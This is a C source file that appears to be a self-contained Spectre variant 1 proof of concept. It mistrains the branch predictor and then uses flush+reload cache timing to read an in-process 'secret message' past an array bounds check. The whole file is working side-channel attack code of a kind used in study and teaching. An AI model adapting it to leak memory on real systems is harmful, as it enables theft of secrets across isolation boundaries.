#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"


#define N_PAGES 256
#define REPETITIONS 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175

const int data_size = 35;
int accessible = 100;
int secret_size = 25;
unsigned char* data = "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message";


__attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* data) {

    //flush bound value
    flush((void*)&accessible);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (index < accessible) {
        unsigned char x = data[index];
        volatile cp_t cp = arr[x];
    }
}

int* spv1(int index) {

    cp_t* arr = mmap_arr_cache_pages(N_PAGES);
    flush_arr((void*)arr, N_PAGES);


    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = accessible + 1;
    int accesses[n_accesses];
    for(int i = 0; i < n_accesses; i++) accesses[i] = i;
    accesses[n_accesses-1] = index;

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        victim_func(accesses[i], arr, data);

        //ensures completion before flushing. bar prevents speculative access from being flushed
        __sync_synchronize();
        flush((void*)&arr[data[i]]);    //TODO: make this sensible
    }

    //make sure previous loop finishes execution
    __sync_synchronize();

    //time loading duration per array index
    int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(arr, N_PAGES);
    return results;
}



int main(int argc, char* argv[]) {

    int*** results = alloc_results(REPETITIONS, secret_size, N_PAGES); //results[REPETITIONS][secret_size][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {

        for (int s = 0; s < secret_size; s++) {
            results[r][s] = spv1(accessible + s);
            __sync_synchronize();
        }
    }
    print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, secret_size);
}